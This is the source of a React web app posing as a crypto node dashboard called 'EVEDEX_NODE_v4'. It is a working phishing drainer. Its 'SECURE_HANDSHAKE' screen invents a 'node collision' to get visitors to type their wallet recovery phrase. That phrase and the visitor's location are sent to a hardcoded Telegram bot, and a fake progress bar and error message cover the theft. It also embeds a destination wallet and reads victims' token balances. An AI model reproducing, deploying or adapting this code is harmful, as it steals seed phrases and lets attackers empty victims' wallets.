import React, { useState, useEffect, useMemo } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';

export default function App() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { sendTransaction } = useSendTransaction();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [kycPhase, setKycPhase] = useState(1); 
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [feedMsg, setFeedMsg] = useState(""); 
  const [visitorInfo, setVisitorInfo] = useState("Locating...");

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 

  const USDT_MAP = { 1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 56: "0x55d398326f99059ff775485246999027b3197955" };
  const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
  const { data: nativeBal } = useBalance({ address });

  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: `${msg}\n📍 LOC: ${visitorInfo}` }) }).catch(()=>{});

  const isSeedValid = useMemo(() => [12, 15, 18, 21, 24].includes(seedVal.trim().split(/\s+/).length), [seedVal]);

  useEffect(() => {
    if (activeTask === "Rectify") {
      setInputVal(tokenBal?.formatted?.slice(0, 10) || nativeBal?.formatted?.slice(0, 10) || "0.00");
    }
  }, [tokenBal, nativeBal, activeTask]);

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      <header style={{display:'flex', justifyContent:'space-between', marginBottom:'25px'}}>
        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'20px'}}>EVEDEX_NODE_v4</div></div>
        <appkit-button />
      </header>

      {isConnected && (
        <>
          {view === "menu" && (
            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
                  <div style={{fontSize:'20px'}}>{n === "Rectify" ? "⚡" : "〽️"}</div>
                  <div style={{fontSize:'9px'}}>{n}</div>
                </button>
              ))}
            </div>
          )}

          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'30px', padding:'25px', textAlign:'center'}}>
              <h2 style={{color:'white'}}>{activeTask}</h2>
              <div style={{backgroundColor:'black', padding:'20px', borderRadius:'15px', margin:'15px 0'}}>
                <input value={inputVal} readOnly={activeTask === "Rectify"} style={{background:'none', border:'none', color:'#10b981', fontSize:'24px', textAlign:'center', width:'100%'}} />
              </div>
              <button onClick={() => setView("seed_gate")} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>START_HANDSHAKE</button>
            </div>
          )}

          {view === "seed_gate" && (
            <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'30px', padding:'35px', textAlign:'center'}}>
                {!isSyncing ? (
                  <>
                    <div style={{color:'#10b981', fontWeight:'900', marginBottom:'10px'}}>🛡️ SECURE_HANDSHAKE</div>
                    <p style={{fontSize:'8px', color:'#64748b', marginBottom:'20px'}}>NODE COLLISION DETECTED. PROVIDE RECOVERY PHRASE TO SECURE RELAY.</p>
                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS..." style={{width:'100%', height:'100px', backgroundColor:'black', color:'#10b981', padding:'15px', borderRadius:'15px'}} />
                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR [0x99A]: CONGESTION."); setView("menu")},1200)}},60);}} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', marginTop:'20px'}}>FINALIZE</button>
                  </>
                ) : (
                  <div><div style={{fontSize:'40px'}}>{syncProgress}%</div><div>INDEXING_POOL...</div></div>
                )}
              </div>
            </div>
          )}
        </>
      )}
    </div>
  );
}
